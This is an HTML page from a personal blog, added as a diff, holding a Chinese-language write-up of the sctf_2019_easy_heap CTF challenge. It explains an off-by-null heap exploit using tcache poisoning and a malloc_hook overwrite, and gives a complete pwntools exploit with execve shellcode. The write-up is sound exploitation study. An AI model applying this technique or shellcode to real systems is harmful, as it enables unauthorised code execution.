@@ -1,0 +1,311 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<title>sctf_2019_easy_heap [ your blog title ]</title>
+	
+	
+	<!-- stylesheets list from _config.yml -->
+	
+	<link rel="stylesheet" href="/css/PreciousJoy.css">
+	
+	<link rel="stylesheet" href="/css/top-bar.css">
+	
+	<link rel="stylesheet" href="/css/menu-outer.css">
+	
+	<link rel="stylesheet" href="/css/content-outer.css">
+	
+	<link rel="stylesheet" href="/css/bottom-outer.css">
+	
+	<link rel="stylesheet" href="/css/atom-one-dark.css">
+	
+	<link rel="stylesheet" href="/css/recent-posts-item.css">
+	
+	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
+	
+	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+	
+	<link rel="stylesheet" href="/css/search.css">
+	
+	<link rel="stylesheet" href="/css/toc.css">
+	
+	<link rel="stylesheet" href="/css/sidebar.css">
+	
+	<link rel="stylesheet" href="/css/archive.css">
+	
+	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
+	
+	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
+	
+	
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+
+
+<body id="wrapper">
+
+	<div id="">
+		
+		<div id="top-bar">
+			
+			<div id="avatar-box">
+				<img 
+				class="avatar"
+				src="/images/default-avatar.jpg" 
+				alt="avatar">
+			</div>
+
+			<div id="top-bar-text">
+				<div id="top-bar-title">
+					pa1n
+				</div>
+				<div id="top-bar-slogan">
+					
+				</div>
+			</div>
+
+		</div>
+
+		<div id="menu-outer">
+			<div id="menu-inner">
+				
+				
+				<div class="menu-item">
+					<a href="/">Home</a>
+				</div>
+				
+				<div class="menu-item">
+					<a href="/about">About</a>
+				</div>
+				
+				<div class="menu-item">
+					<a href="/archives">Archives</a>
+				</div>
+				
+
+				<div class="menu-item menu-item-search">
+					
+  <span class="local-search local-search-google local-search-plugin">
+      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
+      <div id="local-search-result" class="local-search-result-cls"></div>
+  </span>
+	
+				</div>
+
+			</div>
+		</div>
+
+		<div id="content-outer">
+			<div id="content-inner">
+
+				
+<div id="details">
+	
+	<article id="details-post">
+		<div id=details-post-item>
+			<h1>sctf_2019_easy_heap</h1>
+			<h4 id="这道题用off-by-null解"><a href="#这道题用off-by-null解" class="headerlink" title="这道题用off by null解"></a>这道题用off by null解</h4><h5 id="例行检查，保护全开-不能利用got表，只能用hook的地址"><a href="#例行检查，保护全开-不能利用got表，只能用hook的地址" class="headerlink" title="例行检查，保护全开,不能利用got表，只能用hook的地址"></a>例行检查，保护全开,不能利用got表，只能用hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/21/2tYAH.png" alt="image-20231021201805120"></p>
+<h5 id="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"><a href="#程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。" class="headerlink" title="程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。"></a>程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。</h5><h5 id="mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："><a href="#mmap-函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：" class="headerlink" title="mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一："></a>mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一：</h5><ul>
+<li>PROT_EXEC：允许对内存映射区域进行执行访问。</li>
+<li>PROT_READ：允许对内存映射区域进行读取访问。</li>
+<li>PROT_WRITE：允许对内存映射区域进行写入访问。</li>
+<li>PROT_NONE：禁止对内存映射区域进行任何访问。</li>
+</ul>
+<h5 id="当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"><a href="#当权限参数的值为7时，实际上是将PROT-EXEC、PROT-READ和PROT-WRITE三个权限组合在一起，7-4-2-1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。" class="headerlink" title="当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。"></a>当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。</h5><p><img src="https://i.imgs.ovh/2023/10/21/21wjI.png" alt="image-20231021203428599"></p>
+<h5 id="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"><a href="#单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数" class="headerlink" title="单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数"></a>单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数</h5><p><img src="https://i.imgs.ovh/2023/10/21/21fLV.png" alt="image-20231021203536497"></p>
+<h5 id=""><a href="#" class="headerlink" title=" "></a> </h5><h5 id="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址"><a href="#按照题解里的流程，先创建一个0x410大小的堆，并接收其地址-这个地址存了malloc的堆的地址" class="headerlink" title="按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址"></a>按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址</h5><pre><code class="lang-py">add(0x410)
+p.recvuntil(&#39;Address &#39;)
+chunk0_addr=int(p.recv(14),16)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/21ROU.png" alt="image-20231021212103375"></p>
+<h5 id="然后再创建四个大小不同的堆"><a href="#然后再创建四个大小不同的堆" class="headerlink" title="然后再创建四个大小不同的堆"></a>然后再创建四个大小不同的堆</h5><pre><code class="lang-py">
+add(0x28)
+add(0x18)
+add(0x4f8)
+add(0x10)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/21glC.png" alt="image-20231021214117731"></p>
+<h5 id="然后free掉堆0"><a href="#然后free掉堆0" class="headerlink" title="然后free掉堆0"></a>然后free掉堆0</h5><pre><code class="lang-py">dele(0)
+</code></pre>
+<h5 id="然后edit堆2-也就是输入内容，构造下面的unlink"><a href="#然后edit堆2-也就是输入内容，构造下面的unlink" class="headerlink" title="然后edit堆2,也就是输入内容，构造下面的unlink"></a>然后edit堆2,也就是输入内容，构造下面的unlink</h5><pre><code class="lang-py">payload=p64(0)*2+p64(0x420+0x20+0x30)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/2JLl9.png" alt="image-20231021222737762"></p>
+<h5 id="在free堆3后，就会unlink合并，四个堆合并在一起"><a href="#在free堆3后，就会unlink合并，四个堆合并在一起" class="headerlink" title="在free堆3后，就会unlink合并，四个堆合并在一起"></a>在free堆3后，就会unlink合并，四个堆合并在一起</h5><pre><code class="lang-py">dele(3) free堆3
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/21/2JXbO.png" alt="image-20231021223134709"></p>
+<h5 id="这里存堆0，堆3的指针都被清掉了。"><a href="#这里存堆0，堆3的指针都被清掉了。" class="headerlink" title="这里存堆0，堆3的指针都被清掉了。"></a>这里存堆0，堆3的指针都被清掉了。</h5><p><img src="https://i.imgs.ovh/2023/10/21/2Jr5H.png" alt="image-20231021223200332"></p>
+<h5 id="再free堆1，堆2"><a href="#再free堆1，堆2" class="headerlink" title="再free堆1，堆2"></a>再free堆1，堆2</h5><p><img src="https://i.imgs.ovh/2023/10/21/2JFXD.png" alt="image-20231021223634211"></p>
+<p><img src="https://i.imgs.ovh/2023/10/21/2JABo.png" alt="image-20231021223742057"></p>
+<h5 id="然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。"><a href="#然后又malloc两次-两个大小加起来刚好是0x970-会从原来的freechunk中拿。" class="headerlink" title="然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。"></a>然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。</h5><pre><code class="lang-py">add(0x440)
+add(0x510)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/25gco.png" alt="image-20231022185742061"></p>
+<p><img src="https://i.imgs.ovh/2023/10/22/25t9A.png" alt="image-20231022185800359"></p>
+<p><img src="https://i.imgs.ovh/2023/10/22/25JH5.png" alt="image-20231022185836223"></p>
+<h5 id="然后编辑这两个堆的内容"><a href="#然后编辑这两个堆的内容" class="headerlink" title="然后编辑这两个堆的内容"></a>然后编辑这两个堆的内容</h5><pre><code class="lang-py">payload=p64(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)
+fill(0,payload)
+fill(1,&#39;\x30&#39;)
+</code></pre>
+<h5 id="编辑完后，这是堆0的"><a href="#编辑完后，这是堆0的" class="headerlink" title="编辑完后，这是堆0的"></a>编辑完后，这是堆0的</h5><p><img src="https://i.imgs.ovh/2023/10/22/25UdX.png" alt="image-20231022190729493"></p>
+<h5 id="成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。"><a href="#成功修改了0x30的tachebin指针成mmap-10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main-arena-96这个地址。" class="headerlink" title="成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。"></a>成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25j2U.png" alt="image-20231022190804852"></p>
+<h5 id="这是堆1的，bin指针修改成了malloc-hook的地址。"><a href="#这是堆1的，bin指针修改成了malloc-hook的地址。" class="headerlink" title="这是堆1的，bin指针修改成了malloc_hook的地址。"></a>这是堆1的，bin指针修改成了malloc_hook的地址。</h5><p><img src="https://i.imgs.ovh/2023/10/22/25yUK.png" alt="image-20231022191125950"></p>
+<h5 id="原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址"><a href="#原本的话指向main-arena-96这个地址，改掉最后的字节成0x30就是malloc-hook的地址" class="headerlink" title="原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址"></a>原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2YPP2.png" alt="image-20231022191235807"></p>
+<h5 id="再malloc两次，把多余的freechunk拿掉"><a href="#再malloc两次，把多余的freechunk拿掉" class="headerlink" title="再malloc两次，把多余的freechunk拿掉"></a>再malloc两次，把多余的freechunk拿掉</h5><pre><code class="lang-py">add(0x28)#2
+add(0x18)#3
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/2YV6j.png" alt="image-20231022191554689"></p>
+<h5 id="再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧"><a href="#再add堆5，也就是在maap-10这个地址上放shellcode，手写shellcode是真的强好吧" class="headerlink" title="再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧"></a>再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧</h5><pre><code class="lang-py">add(0x28)#5
+payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+fill(5,payload2 + &#39;\n&#39;)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/2YLeI.png" alt="image-20231022191845126"></p>
+<h5 id="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。"><a href="#再add堆6，大小在0x10到0x18之间才能在0x20的tachebin-malloc-hook-里申请，这里我们放上st-addr-0x10的地址，也就是maap-addr-0x10的地址。" class="headerlink" title="再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。"></a>再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。</h5><pre><code class="lang-py">add(0x18)#6
+edit(6,p64(st_addr + 0x10) + &#39;\n&#39;)
+</code></pre>
+<p><img src="https://i.imgs.ovh/2023/10/22/2YXGV.png" alt="image-20231022192746832"></p>
+<h5 id="这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址"><a href="#这是堆5和堆6的地址，也就是mmap-10的地址和malloc-hook的地址" class="headerlink" title="这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址"></a>这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/10/22/2Y2MJ.png" alt="image-20231022192836650"></p>
+<h5 id="最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。"><a href="#最后，再malloc一次，就会执行malloc-hook-而这个地址就会去执行mmap-0x10这个地址，这个地址放又shellcode，成功提权。" class="headerlink" title="最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。"></a>最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。</h5><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
+from LibcSearcher import *
+p=remote(&quot;node4.buuoj.cn&quot;,29573)
+#p=process(&quot;./sctf_2019_easy_heap&quot;)
+context(arch=&#39;amd64&#39;)
+context.log_level=&quot;debug&quot;
+libc=ELF(&#39;./libc-2.27.so&#39;)
+
+def add(size):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)
+    p.sendlineafter(&#39;Size: &#39;,str(size))
+
+def fill(index,content):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)
+    p.sendlineafter(&#39;Index: &#39;,str(index))
+    p.sendlineafter(&#39;Content: &#39;,content)
+
+def dele(index):
+    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)
+    p.sendlineafter(&#39;Index: &#39;,str(index))
+
+p.recvuntil(&#39;Mmap: &#39;)
+mmap_addr=int(p.recv(12),16)
+print(hex(mmap_addr))
+
+add(0x410) 
+add(0x28)
+add(0x18)
+add(0x4f8)
+add(0x10)
+
+dele(0)
+
+payload=p64(0)*2+p64(0x420+0x20+0x30)
+fill(2,payload)
+
+dele(3)
+dele(1)
+dele(2)
+
+add(0x440)
+add(0x510)
+
+payload=&#39;a&#39;*(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10)
+fill(0,payload)
+fill(1,&#39;\x30&#39;)
+
+add(0x28)#2
+add(0x18)#3
+
+add(0x28)#5
+add(0x18)#6
+
+payload2 = b&quot;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&quot;
+
+fill(5,payload2)
+fill(6,p64(mmap_addr + 0x10))
+
+add(0x10)
+p.interactive()
+</code></pre>
+
+		</div>
+
+		<!-- 来必力City版安装代码 -->
+<div id="lv-container" data-id="city" data-uid="MTAyMC80NjIyNC8yMjczNQ==">
+	<script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+   })(document, 'script');
+	</script>
+<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+</div>
+<!-- City版安装代码已完成 -->
+		
+	</article>
+
+	<div id="toc">
+		
+	</div>
+
+</div>
+
+<!-- <div id="paginator"> -->
+<!-- 	 -->
+<!-- </div> -->
+
+
+			</div>
+		</div>
+
+		<div id="bottom-outer">
+			<div id="bottom-inner">
+				Site by your name | 
+				Powered by <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a> |
+				theme <a target="_blank" rel="noopener" href="https://github.com/fireworks99/hexo-theme-PreciousJoy">PreciousJoy</a>
+			</div>
+		</div>
+
+		
+	</div>
+
+
+
+
+
+	
+	<!-- scripts list from theme config.yml -->
+	
+	<script src="/js/jquery-3.5.1.min.js"></script>
+	
+	<script src="/js/PreciousJoy.js"></script>
+	
+	<script src="/js/highlight.pack.js"></script>
+	
+	<script src="/js/jquery.fancybox.min.js"></script>
+	
+	<script src="/js/search.js"></script>
+	
+	<script src="/js/load.js"></script>
+	
+	<script src="/js/jquery.mCustomScrollbar.concat.min.js"></script>
+	
+	<script src="/js/clipboard.min.js"></script>
+	
+	
+
+	<script>hljs.initHighlightingOnLoad();</script>
+
+</body>
+</html>
